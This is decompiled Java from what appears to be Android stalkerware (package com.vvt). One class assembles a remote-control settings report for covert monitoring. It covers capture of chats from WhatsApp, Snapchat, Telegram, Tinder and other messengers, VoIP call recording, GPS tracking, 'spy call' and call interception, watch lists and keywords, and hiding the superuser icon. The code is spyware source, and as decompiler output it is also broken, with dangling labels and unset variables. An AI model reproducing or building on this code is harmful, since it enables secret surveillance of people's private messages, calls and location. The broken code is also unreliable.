package com.vvt.appengine.a;

import android.content.Context;
import android.location.LocationManager;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FeatureId;
import com.vvt.base.FxAddressbookMode;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.configurationmanager.c;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefAddressBook;
import com.vvt.preference.PrefCISNumber;
import com.vvt.preference.PrefCallRecordingAudioSource;
import com.vvt.preference.PrefCallRecordingWatchFlag;
import com.vvt.preference.PrefCallRecordingWatchNumber;
import com.vvt.preference.PrefEmergencyNumber;
import com.vvt.preference.PrefEventsCapture;
import com.vvt.preference.PrefHomeNumber;
import com.vvt.preference.PrefIMCaptureSettings;
import com.vvt.preference.PrefKeyword;
import com.vvt.preference.PrefMonitorNumber;
import com.vvt.preference.PrefNotificationNumber;
import com.vvt.preference.PrefPanic;
import com.vvt.preference.PrefSpyCall;
import com.vvt.preference.PrefTemporalControl;
import com.vvt.preference.PrefVoipCallRecordingCaptureSettings;
import com.vvt.preference.PrefWatchList;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import com.vvt.remotecontrol.output.RmtCtrlOutputSettings;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class j
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  private RmtCtrlOutputSettings a(AppEngine1 paramh, int paramInt, List paramList, Map paramMap)
  {
    RmtCtrlOutputSettings localRmtCtrlOutputSettings = new com/vvt/remotecontrol/output/RmtCtrlOutputSettings;
    localRmtCtrlOutputSettings.<init>();
    com.vvt.preference.b localb;
    label662:
    label706:
    label750:
    label794:
    label838:
    label914:
    label929:
    label944:
    label959:
    label974:
    label1070:
    label1115:
    label1160:
    label1205:
    label1250:
    label1295:
    label1340:
    label1385:
    label1430:
    label1475:
    label1520:
    label1565:
    label1610:
    label1655:
    label1700:
    label1899:
    label1914:
    label1929:
    label1944:
    label1959:
    label1974:
    label1989:
    label2004:
    label2019:
    label2034:
    label2049:
    label2064:
    label2079:
    label2094:
    label2109:
    Object localObject8;
    for (;;)
    {
      Context localContext;
      Object localObject3;
      Object localObject4;
      String str;
      try
      {
        localContext = paramh.a();
        localb = paramh.n;
        Object localObject1 = FxPreferenceType.EVENTS_CTRL;
        localObject1 = localb.a((FxPreferenceType)localObject1);
        localObject1 = (PrefEventsCapture)localObject1;
        localObject3 = FxPreferenceType.IM_CAPTURE_SETTINGS;
        localObject3 = localb.a((FxPreferenceType)localObject3);
        localObject3 = (PrefIMCaptureSettings)localObject3;
        localObject4 = FxPreferenceType.VOIP_CALLRECORDING_CAPTURE_SETTINGS;
        localObject4 = localb.a((FxPreferenceType)localObject4);
        localObject4 = (PrefVoipCallRecordingCaptureSettings)localObject4;
        bool1 = ((PrefEventsCapture)localObject1).isCaptureEnabled();
        boolean bool4 = ((PrefEventsCapture)localObject1).isDeliverEnabled();
        Object localObject5 = paramh.d();
        i2 = ((PrefEventsCapture)localObject1).getTriggerNumber();
        int i5 = ((PrefEventsCapture)localObject1).getDeliverTimer();
        FxDeliveryMethod localFxDeliveryMethod = ((PrefEventsCapture)localObject1).getDeliveryMethod();
        localRmtCtrlOutputSettings.setConfigurationId(paramInt);
        localRmtCtrlOutputSettings.setCaptureEnabled(bool1);
        localRmtCtrlOutputSettings.setDeliverEnabled(bool4);
        localRmtCtrlOutputSettings.setTriggerNumber(i2);
        localRmtCtrlOutputSettings.setDeliveryTimer(i5);
        localRmtCtrlOutputSettings.setRunningMode((RunningMode)localObject5);
        localRmtCtrlOutputSettings.setDeliveryMethod(localFxDeliveryMethod);
        bool1 = com.vvt.ab.e.a(localContext);
        localRmtCtrlOutputSettings.setSuperUserIconHidden(bool1);
        localObject5 = paramList.iterator();
        bool1 = ((Iterator)localObject5).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject5).next();
        localObject6 = (FeatureId)localObject6;
        localObject7 = k.a;
        i2 = ((FeatureId)localObject6).ordinal();
        int k = localObject7[i2];
        switch (k)
        {
        case 21: 
        case 22: 
        case 23: 
        case 24: 
        case 35: 
        case 36: 
        default: 
          break;
        case 1: 
        case 2: 
          bool5 = ((PrefEventsCapture)localObject1).isCapture((FeatureId)localObject6);
          localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
          break;
        case 3: 
          boolean bool9;
          bool5 = str.isCapture((FeatureId)localObject6);
        }
      }
      finally
      {
        bool9 = b;
        if (bool9) {}
        localObject3 = new com/vvt/remotecontrol/RemoteControlException;
        str = ((Throwable)localObject2).getMessage();
        ((RemoteControlException)localObject3).<init>(str);
      }
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
      continue;
      boolean bool5 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
      continue;
      localObject7 = "location";
      localObject7 = localContext.getSystemService((String)localObject7);
      localObject7 = (LocationManager)localObject7;
      int i2 = 1;
      localObject7 = ((LocationManager)localObject7).getProviders(i2);
      localRmtCtrlOutputSettings.setLocationProviders((List)localObject7);
      bool5 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
      long l1 = str.getGpsTrackingIntervalMs();
      localRmtCtrlOutputSettings.setGpsTrackingIntervalMs(l1);
      continue;
      bool5 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
      localObject6 = "92";
      localObject6 = paramMap.get(localObject6);
      localObject6 = (List)localObject6;
      bool5 = a;
      if (bool5) {}
      localObject7 = "401";
      bool5 = ((List)localObject6).contains(localObject7);
      if (bool5)
      {
        bool5 = true;
        localRmtCtrlOutputSettings.setFacebookVoipCallRecordingCaptureSupported(bool5);
        bool5 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isFacebookVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setFacebookVoipCallRecordingCaptureEnabled(bool5);
        localObject7 = "410";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label914;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setHangoutVoipCallRecordingCaptureSupported(bool5);
        bool5 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isHangoutVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setHangoutVoipCallRecordingCaptureEnabled(bool5);
        localObject7 = "404";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label929;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setLineVoipCallRecordingCaptureSupported(bool5);
        bool5 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isLineVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setLineVoipCallRecordingCaptureEnabled(bool5);
        localObject7 = "400";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label944;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setSkypeVoipCallRecordingCaptureSupported(bool5);
        bool5 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isSkypeVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setSkypeVoipCallRecordingCaptureEnabled(bool5);
        localObject7 = "402";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label959;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setViberVoipCallRecordingCaptureSupported(bool5);
        bool5 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isViberVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setViberVoipCallRecordingCaptureEnabled(bool5);
        localObject7 = "403";
        bool1 = ((List)localObject6).contains(localObject7);
        if (!bool1) {
          break label974;
        }
        bool1 = true;
        localRmtCtrlOutputSettings.setWhatsAppVoipCallRecordingCaptureSupported(bool1);
      }
      for (;;)
      {
        bool1 = ((PrefVoipCallRecordingCaptureSettings)localObject4).isWhatsAppVoipCallRecordingCaptureEnabled();
        localRmtCtrlOutputSettings.setWhatsAppVoipCallRecordingCaptureEnabled(bool1);
        break;
        bool5 = false;
        localObject7 = null;
        localRmtCtrlOutputSettings.setFacebookVoipCallRecordingCaptureSupported(false);
        break label662;
        bool5 = false;
        localObject7 = null;
        localRmtCtrlOutputSettings.setHangoutVoipCallRecordingCaptureSupported(false);
        break label706;
        bool5 = false;
        localObject7 = null;
        localRmtCtrlOutputSettings.setLineVoipCallRecordingCaptureSupported(false);
        break label750;
        bool5 = false;
        localObject7 = null;
        localRmtCtrlOutputSettings.setSkypeVoipCallRecordingCaptureSupported(false);
        break label794;
        bool5 = false;
        localObject7 = null;
        localRmtCtrlOutputSettings.setViberVoipCallRecordingCaptureSupported(false);
        break label838;
        bool1 = false;
        localObject6 = null;
        localRmtCtrlOutputSettings.setWhatsAppVoipCallRecordingCaptureSupported(false);
      }
      bool5 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool5);
      localObject6 = "92";
      localObject6 = paramMap.get(localObject6);
      localObject6 = (List)localObject6;
      bool5 = a;
      if (bool5) {}
      localObject7 = "204";
      bool5 = ((List)localObject6).contains(localObject7);
      if (bool5)
      {
        bool5 = true;
        localRmtCtrlOutputSettings.setBBMCaptureSupoprted(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isBBMCaptureEnabled();
        localRmtCtrlOutputSettings.setBBMCaptureEnabled(bool5);
        localObject7 = "202";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1899;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setFacebookCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isFacebookCaptureEnabled();
        localRmtCtrlOutputSettings.setFacebookCaptureEnabled(bool5);
        localObject7 = "211";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1914;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setHangoutCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isHangoutCaptureEnabled();
        localRmtCtrlOutputSettings.setHangoutCaptureEnabled(bool5);
        localObject7 = "201";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1929;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setLineCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isLineCaptureEnabled();
        localRmtCtrlOutputSettings.setLineCaptureEnabled(bool5);
        localObject7 = "203";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1944;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setSkypeCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isSkypeCaptureEnabled();
        localRmtCtrlOutputSettings.setSkypeCaptureEnabled(bool5);
        localObject7 = "206";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1959;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setViberCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isViberCaptureEnabled();
        localRmtCtrlOutputSettings.setViberCaptureEnabled(bool5);
        localObject7 = "208";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1974;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setWeChatCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isWeChatCaptureEnabled();
        localRmtCtrlOutputSettings.setWeChatCaptureEnabled(bool5);
        localObject7 = "209";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label1989;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setYahooMessengerCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isYahooMessengerCaptureEnabled();
        localRmtCtrlOutputSettings.setYahooMessengerCaptureEnabled(bool5);
        localObject7 = "210";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2004;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setSnapchatCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isSnapchatCaptureEnabled();
        localRmtCtrlOutputSettings.setSnapchatCaptureEnabled(bool5);
        localObject7 = "200";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2019;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setWhatsAppCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isWhatsAppCaptureEnabled();
        localRmtCtrlOutputSettings.setWhatsAppCaptureEnabled(bool5);
        localObject7 = "213";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2034;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setKikMessengerCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isKikMessengerCaptureEnabled();
        localRmtCtrlOutputSettings.setKikMessengerCaptureEnabled(bool5);
        localObject7 = "214";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2049;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setTelegramMessengerCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isTelegramCaptureEnabled();
        localRmtCtrlOutputSettings.setTelegramMessengerCaptureEnabled(bool5);
        localObject7 = "215";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2064;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setTinderCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isTinderCaptureEnabled();
        localRmtCtrlOutputSettings.setTinderCaptureEnabled(bool5);
        localObject7 = "217";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2079;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setInstagramCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isInstagramCaptureEnabled();
        localRmtCtrlOutputSettings.setInstagramCaptureEnabled(bool5);
        localObject7 = "216";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2094;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setQQCaptureSupported(bool5);
        bool5 = ((PrefIMCaptureSettings)localObject3).isQQCaptureEnabled();
        localRmtCtrlOutputSettings.setQQCaptureEnabled(bool5);
        localObject7 = "218";
        bool5 = ((List)localObject6).contains(localObject7);
        if (!bool5) {
          break label2109;
        }
        bool5 = true;
        localRmtCtrlOutputSettings.setHikeCaptureSupported(bool5);
      }
      for (;;)
      {
        bool5 = ((PrefIMCaptureSettings)localObject3).isHikeCaptureEnabled();
        localRmtCtrlOutputSettings.setHikeCaptureEnabled(bool5);
        int m = 75;
        localObject7 = Integer.toString(m);
        bool1 = ((List)localObject6).contains(localObject7);
        if (!bool1) {
          break;
        }
        localObject6 = new com/vvt/remotecontrol/input/RmtCtrlInputImAttachmentLimitSize;
        ((RmtCtrlInputImAttachmentLimitSize)localObject6).<init>();
        m = 0;
        localObject7 = null;
        long l2 = ((PrefIMCaptureSettings)localObject3).getImageAttachmentSizeLimit();
        ((RmtCtrlInputImAttachmentLimitSize)localObject6).setImAttchmentLimitSize(0, l2);
        m = 1;
        l2 = ((PrefIMCaptureSettings)localObject3).getAudioAttachmentSizeLimit();
        ((RmtCtrlInputImAttachmentLimitSize)localObject6).setImAttchmentLimitSize(m, l2);
        m = 2;
        l2 = ((PrefIMCaptureSettings)localObject3).getVideoAttachmentSizeLimit();
        ((RmtCtrlInputImAttachmentLimitSize)localObject6).setImAttchmentLimitSize(m, l2);
        m = 3;
        l2 = ((PrefIMCaptureSettings)localObject3).getNonMediaAttachmentSizeLimit();
        ((RmtCtrlInputImAttachmentLimitSize)localObject6).setImAttchmentLimitSize(m, l2);
        localRmtCtrlOutputSettings.setImAttachmentLimitSize((RmtCtrlInputImAttachmentLimitSize)localObject6);
        break;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setBBMCaptureSupoprted(false);
        break label1070;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setFacebookCaptureSupported(false);
        break label1115;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setHangoutCaptureSupported(false);
        break label1160;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setLineCaptureSupported(false);
        break label1205;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setSkypeCaptureSupported(false);
        break label1250;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setViberCaptureSupported(false);
        break label1295;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setWeChatCaptureSupported(false);
        break label1340;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setYahooMessengerCaptureSupported(false);
        break label1385;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setSnapchatCaptureSupported(false);
        break label1430;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setWhatsAppCaptureSupported(false);
        break label1475;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setKikMessengerCaptureSupported(false);
        break label1520;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setTelegramMessengerCaptureSupported(false);
        break label1565;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setTinderCaptureSupported(false);
        break label1610;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setInstagramCaptureSupported(false);
        break label1655;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setQQCaptureSupported(false);
        break label1700;
        m = 0;
        localObject7 = null;
        localRmtCtrlOutputSettings.setHikeCaptureSupported(false);
      }
      boolean bool6 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool6);
      continue;
      bool6 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool6);
      continue;
      bool6 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool6);
      continue;
      bool6 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool6);
      localObject6 = FxPreferenceType.CALL_RECORDING_AUDIO_SOURCE;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefCallRecordingAudioSource)localObject6;
      int n = ((PrefCallRecordingAudioSource)localObject6).getAudioSource();
      localObject7 = RmtCtrlInputCallRecordingAudioSource.AudioSource.forValue(n);
      if (localObject7 == null)
      {
        localObject7 = RmtCtrlInputCallRecordingAudioSource.AudioSource.MICROPHONE;
        i3 = ((RmtCtrlInputCallRecordingAudioSource.AudioSource)localObject7).getId();
        ((PrefCallRecordingAudioSource)localObject6).setAudioSource(i3);
        localb.b();
      }
      localObject6 = localObject7;
      localRmtCtrlOutputSettings.setCallRecordingAudioSource((RmtCtrlInputCallRecordingAudioSource.AudioSource)localObject7);
      continue;
      boolean bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      localObject7 = FxPreferenceType.ADDRESSBOOK;
      localObject7 = localb.a((FxPreferenceType)localObject7);
      localObject7 = (PrefAddressBook)localObject7;
      localObject8 = ((PrefAddressBook)localObject7).getMode();
      localObject7 = RmtCtrlInputAddressBookMode.Mode.OFF;
      Object localObject9 = FxAddressbookMode.MONITOR;
      if (localObject8 == localObject9)
      {
        localObject7 = RmtCtrlInputAddressBookMode.Mode.MONITOR;
        label2459:
        localRmtCtrlOutputSettings.setAddressBookMode((RmtCtrlInputAddressBookMode.Mode)localObject7);
        localObject8 = paramh.C;
        if (localObject8 == null) {
          continue;
        }
        localObject8 = RmtCtrlInputAddressBookMode.Mode.MONITOR;
        if (localObject7 != localObject8) {
          break label2524;
        }
        bool7 = true;
      }
      for (;;)
      {
        localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
        break;
        localObject9 = FxAddressbookMode.RESTRICTED;
        if (localObject8 != localObject9) {
          break label2459;
        }
        localObject7 = RmtCtrlInputAddressBookMode.Mode.RESTRICTED;
        break label2459;
        label2524:
        bool7 = false;
        localObject7 = null;
      }
      bool7 = str.isCapture((FeatureId)localObject6);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool7);
      continue;
      localObject6 = FxPreferenceType.PANIC;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefPanic)localObject6;
      int i1 = ((PrefPanic)localObject6).getPanicMode();
      localObject6 = RmtCtrlInputPanicMode.Mode.LOCATION_ONLY;
      int i3 = 1;
      if (i1 == i3) {
        localObject6 = RmtCtrlInputPanicMode.Mode.LOCATION_AND_IMAGE;
      }
      localRmtCtrlOutputSettings.setPanicMode((RmtCtrlInputPanicMode.Mode)localObject6);
      continue;
      localObject6 = FxPreferenceType.SPY_CALL;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefSpyCall)localObject6;
      localObject7 = FeatureId.SPY_CALL;
      int i4 = ((PrefSpyCall)localObject6).isSpyCallEnabled();
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject7, i4);
      localObject7 = FeatureId.CALL_INTERCEPT;
      boolean bool1 = ((PrefSpyCall)localObject6).isCallInterceptEnabled();
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject7, bool1);
      continue;
      localObject6 = FxPreferenceType.CIS_NUMBER;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefCISNumber)localObject6;
      localObject6 = ((PrefCISNumber)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject7).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.CIS_NUMBER;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject6 = FxPreferenceType.EMERGENCY_NUMBER;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefEmergencyNumber)localObject6;
      localObject6 = ((PrefEmergencyNumber)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject7).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.EMERGENCY_NUMBER;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject6 = FxPreferenceType.HOME_NUMBER;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefHomeNumber)localObject6;
      localObject6 = ((PrefHomeNumber)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject7).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.HOME_NUMBER;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject6 = FxPreferenceType.MONITOR_NUMBER;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefMonitorNumber)localObject6;
      localObject6 = ((PrefMonitorNumber)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject7).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.MONITOR_NUMBER;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject6 = FxPreferenceType.NOTIFICATION_NUMBER;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefNotificationNumber)localObject6;
      localObject6 = ((PrefNotificationNumber)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject7).hasNext();
        if (!bool1) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.NOTIFICATION_NUMBER;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject6 = FxPreferenceType.WATCH_LIST;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefWatchList)localObject6;
      bool8 = ((PrefWatchList)localObject6).isEnabled();
      localObject8 = FeatureId.CALL_WATCH_NOTIFICATION;
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject8, bool8);
      localObject7 = ((PrefWatchList)localObject6).getList();
      localObject8 = ((List)localObject7).iterator();
      for (;;)
      {
        bool8 = ((Iterator)localObject8).hasNext();
        if (!bool8) {
          break;
        }
        localObject7 = ((Iterator)localObject8).next();
        localObject7 = (String)localObject7;
        localObject9 = FeatureId.CALL_WATCH_NOTIFICATION;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject9, (String)localObject7);
      }
      bool8 = a;
      if (bool8) {}
      int i = ((PrefWatchList)localObject6).getWatchFlag();
      localRmtCtrlOutputSettings.setWatchFlag(i);
      continue;
      localObject6 = FxPreferenceType.KEYWORD;
      localObject6 = localb.a((FxPreferenceType)localObject6);
      localObject6 = (PrefKeyword)localObject6;
      localObject6 = ((PrefKeyword)localObject6).getList();
      localObject7 = ((List)localObject6).iterator();
      for (;;)
      {
        boolean bool2 = ((Iterator)localObject7).hasNext();
        if (!bool2) {
          break;
        }
        localObject6 = ((Iterator)localObject7).next();
        localObject6 = (String)localObject6;
        localObject8 = FeatureId.SMS_KEYWORD;
        localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
      }
      localObject7 = FxPreferenceType.TEMPORAL_CONTROL;
      localObject7 = localb.a((FxPreferenceType)localObject7);
      localObject7 = (PrefTemporalControl)localObject7;
      i4 = 1;
      localObject8 = Integer.valueOf(i4);
      bool8 = ((PrefTemporalControl)localObject7).isCapture((Integer)localObject8);
      localRmtCtrlOutputSettings.addFeatureStatus((FeatureId)localObject6, bool8);
    }
    Object localObject6 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
    localObject6 = localb.a((FxPreferenceType)localObject6);
    localObject6 = (PrefCallRecordingWatchFlag)localObject6;
    boolean bool8 = a;
    if (bool8) {}
    int j = ((PrefCallRecordingWatchFlag)localObject6).getCallRecWatchFlag();
    localRmtCtrlOutputSettings.setCallRecWatchFlag(j);
    localObject6 = FxPreferenceType.CALL_RECORDING_WATCH_NUMBER;
    localObject6 = localb.a((FxPreferenceType)localObject6);
    localObject6 = (PrefCallRecordingWatchNumber)localObject6;
    localObject6 = ((PrefCallRecordingWatchNumber)localObject6).getList();
    Object localObject7 = ((List)localObject6).iterator();
    for (;;)
    {
      boolean bool3 = ((Iterator)localObject7).hasNext();
      if (!bool3) {
        break;
      }
      localObject6 = ((Iterator)localObject7).next();
      localObject6 = (String)localObject6;
      localObject8 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      localRmtCtrlOutputSettings.addCommonData((FeatureId)localObject8, (String)localObject6);
    }
    return localRmtCtrlOutputSettings;
  }
  
  public RmtCtrlOutputSettings a(AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramh.k;
    Object localObject2 = ((com.vvt.license.b)localObject1).a();
    int i = ((LicenseInfo)localObject2).getConfigurationId();
    Object localObject3 = ((LicenseInfo)localObject2).getLicenseStatus();
    LicenseStatus localLicenseStatus = LicenseStatus.NOT_ACTIVATED;
    if (localObject3 == localLicenseStatus) {
      i = -1;
    }
    for (;;)
    {
      localObject2 = paramh.e.a(i);
      localObject3 = ((c)localObject2).b();
      boolean bool2 = a;
      if (bool2) {}
      localObject2 = ((c)localObject2).c();
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      localObject1 = a(paramh, i, (List)localObject3, (Map)localObject2);
      boolean bool3 = a;
      if (bool3) {}
      return (RmtCtrlOutputSettings)localObject1;
      localObject3 = ((LicenseInfo)localObject2).getLicenseStatus();
      localLicenseStatus = LicenseStatus.EXPIRED;
      if (localObject3 == localLicenseStatus)
      {
        i = -2;
      }
      else
      {
        localObject2 = ((LicenseInfo)localObject2).getLicenseStatus();
        localObject3 = LicenseStatus.DISABLED;
        if (localObject2 == localObject3) {
          i = -3;
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/j.class
